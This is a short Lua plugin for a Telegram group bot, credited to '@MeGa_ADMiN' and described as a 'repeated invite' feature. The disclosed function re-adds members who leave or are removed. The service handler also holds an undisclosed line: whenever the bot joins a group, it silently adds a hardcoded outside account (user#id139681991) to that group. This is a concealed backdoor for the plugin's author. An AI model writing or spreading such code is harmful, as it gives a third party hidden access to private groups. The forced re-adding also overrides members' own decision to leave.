    --This Plugin Powered By @MeGa_ADMiN 
    --ID CHannel:@MeGaB0T_TeaM	

do
local function invite_user(chat, user)
   local status = chat_add_user (chat, user, ok_cb, false)
   if not status then
      return "اررور 👁".. [[
	  
	  
	  
	  Contact With @Mega_admin
	  ]]
   end
   return "کاربر: "..user.." ادد شد به گروه "..chat
end
local function service_msg(msg)
    if msg.action.user.id == our_id then
       local chat = 'chat#id'..msg.to.id
       local user = 'user#id139681991'
      chat_add_user(chat, user, callback, false)
     end
   local receiver = get_receiver(msg)
   local response = ""
   if msg.action.type == "chat_del_user" and msg.from.id ~= 113481618 and msg.from.id ~= our_id then
      print(invite_user("chat#id"..msg.to.id, "user#id"..msg.action.user.id))
   end

   send_large_msg(receiver, response)
end

return {
  description = "اینوایت مکرر 👁",
  usage = "اینوایت مکرر",
  patterns = {},
  on_service_msg = service_msg
}
end
    --This Plugin Powered By @MeGa_ADMiN 
    --ID CHannel:@MeGaB0T_TeaM	
